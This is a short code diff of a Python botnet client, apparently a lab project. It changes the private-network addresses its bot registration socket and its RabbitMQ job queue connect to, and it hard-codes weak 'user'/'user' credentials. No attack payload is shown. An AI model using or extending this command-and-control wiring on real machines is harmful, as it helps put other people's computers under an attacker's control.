@@ -13,7 +13,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 class Client():
     def __init__(self):
         self.bot_registration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.bot_registration_address = ('192.168.0.105', 5582)
+        self.bot_registration_address = ('192.168.0.114', 5582)
         self.commands = {1: self.command1, 2: self.command2}
         self.event_controller = threading.Event()
         self.botnet_id = 0
@@ -21,7 +21,7 @@ class Client():
         self.botnet_job_id = 0
         # TODO: unsafe credentials
         self.credentials = pika.PlainCredentials('user', 'user')
-        self.parameters = pika.ConnectionParameters('192.168.0.112', 5672, '/', self.credentials)
+        self.parameters = pika.ConnectionParameters('192.168.0.114', 5672, '/', self.credentials)
         self.connection = pika.BlockingConnection(self.parameters)
 
 
